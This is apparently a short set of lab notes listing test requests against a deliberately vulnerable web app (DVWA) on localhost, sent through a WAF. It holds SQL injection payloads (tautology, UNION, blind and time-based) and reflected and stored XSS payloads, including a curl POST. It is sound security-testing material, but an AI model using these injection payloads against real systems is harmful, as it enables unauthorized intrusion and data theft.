DVWA attack hits via WAF (authorized local lab only)
Base target: http://localhost:8080
Note: Always run through :8080 (WAF), not :8888 (direct DVWA).

========================================
1) SQL Injection (GET)
========================================
http://localhost:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit
http://localhost:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--+-&Submit=Submit

========================================
2) Blind SQL Injection (GET)
========================================
http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1--+-&Submit=Submit
http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29--+-&Submit=Submit

========================================
3) XSS Reflected (GET)
========================================
http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E

========================================
4) XSS Stored (POST)
========================================
curl -i -X POST "http://localhost:8080/vulnerabilities/xss_s/" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	--data "txtName=tester&mtxMessage=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&btnSign=Sign+Guestbook"

Quick check tips:
- If a URL returns 404, that DVWA module is not available in your current DVWA version.
- Some modules require a DVWA login session cookie to work; run requests in browser after login or use curl with cookie jar.
